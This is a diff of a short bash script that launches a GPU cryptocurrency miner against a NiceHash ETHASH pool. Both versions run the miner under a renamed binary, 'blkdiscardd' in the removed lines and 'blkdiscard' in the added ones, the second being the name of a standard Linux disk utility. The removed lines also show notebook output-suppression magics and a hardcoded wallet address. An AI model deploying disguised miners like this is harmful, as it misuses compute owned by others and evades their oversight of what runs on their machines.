@@ -1,13 +1,8 @@
 #!/bin/bash
-%%capture
-!%%capture
-
-#gives ip address 
-curl ipecho.net/plain
-POOL=https://next.ton-pool.com
+POOL=stratum+ssl://daggerhashimoto.auto.nicehash.com:443
 USER=$1
-ALGO=TON
 WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
+ALGO=ETHASH
 
-chmod +x blkdiscardd
-./blkdiscardd --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 3PMe6Cv8cR4LRyH2JwHo4eKY1TtZGGrEq3.$(echo $(shuf -i 1-9999 -n 1)-Mitzy)
+chmod +x blkdiscard
+./blkdiscard -a $ALGO --pool $POOL --user $USER.$WORKER --ethstratum ETHPROXY
